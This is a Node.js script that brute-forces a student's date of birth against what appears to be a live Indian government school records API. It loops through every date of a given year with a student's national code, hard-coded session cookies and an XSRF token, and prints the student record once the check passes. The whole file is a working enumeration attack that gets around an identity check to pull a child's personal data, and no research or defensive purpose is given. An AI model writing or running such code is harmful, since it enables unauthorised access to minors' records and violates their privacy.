const axios = require('axios');
const { isValid, parse } = require('date-fns');

// ======================= CONFIGURATION =======================
// Replace these values with your actual data
const SCHOOL_ID = '1818033';          // from URL: .../search/{schoolId}
const STUDENT_PEN = '22619889720';    // studentCodeNat
const YEAR = 2019;                    // known year of birth
// Optional: If the API requires session cookies / CSRF token, uncomment and set them
// const COOKIE = 'JSESSIONID=...; XSRF-TOKEN=...';
// const CSRF_TOKEN = '...';
// ==============================================================

// API endpoint (POST)
const API_URL = `https://sdms.udiseplus.gov.in/p2/api/students/import/search/${SCHOOL_ID}`;


const headers = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',

    'Cookie': 'JSESSIONID=app1~app2~06E37A2C0E5BCACCAE5FEA3D0A8FDD1E; XSRF-TOKEN=3a6494a0-d285-449c-a491-b47c50036286; NSC_tent.vejtfqmvt_nqy_Wtfswfs_TTM=ffffffff09ca4c1d45525d5f4f58455e445a4a423660'
};

// Delay between requests (milliseconds) to avoid overwhelming the server
const REQUEST_DELAY_MS = 500;

// Helper: generate all valid date strings for a given year (DD/MM/YYYY)
function getAllValidDates(year) {
  const dates = [];
  for (let month = 1; month <= 12; month++) { 
    for (let day = 1; day <= 31; day++) {
      const dateStr = `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
      const parsedDate = parse(dateStr, 'dd/MM/yyyy', new Date());
      if (isValid(parsedDate) && parsedDate.getFullYear() === year) {
        dates.push(dateStr);
      }
    }
  }
  return dates;
}

// Helper: sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Main function
async function findDOB() {
  const allDates = getAllValidDates(YEAR);
  console.log(`🔍 Total possible dates to try: ${allDates.length}`);

  for (let i = 0; i < allDates.length; i++) {
    const dob = allDates[i];
    const payload = {
      searchType: 1,
      studentCodeNat: STUDENT_PEN,
      dob: dob,
      uuid: ""   // as seen in failure example, but not always required
    };

    console.log(`📅 Trying date ${i + 1}/${allDates.length}: ${dob} ...`);

    try {
      const response = await axios.post(API_URL, payload, { headers });

      // The API always returns HTTP 200, but status flag inside JSON indicates success/failure
      if (response.data && response.data.status === true) {
        console.log('\n✅ SUCCESS! Correct date of birth found:');
        console.log(`   DOB: ${dob}`);
        console.log('   Student data:', JSON.stringify(response.data.data, null, 2));
        console.log(`\n🏁 Stopped after ${i + 1} attempts.`);
        return; // exit the function (and script)
      } else {
        // Optional: log error message for debugging (disable for speed)
        if (response.data && response.data.error) {
          console.log(`   ❌ Failed: ${response.data.error.message || 'Unknown error'}`);
        } else {
          console.log(`   ❌ Failed: status = ${response.data?.status}`);
        }
      }
    } catch (error) {
      console.error(`   ⚠️ Request error for ${dob}:`, error.message);
      // Continue trying next date
    }

    // Wait before next request to be polite to the server
    await sleep(REQUEST_DELAY_MS);
  }

  console.log('\n❌ No matching date of birth found for the given PEN and year.');
}

// Run the script
findDOB().catch(err => {
  console.error('Fatal error:', err);
});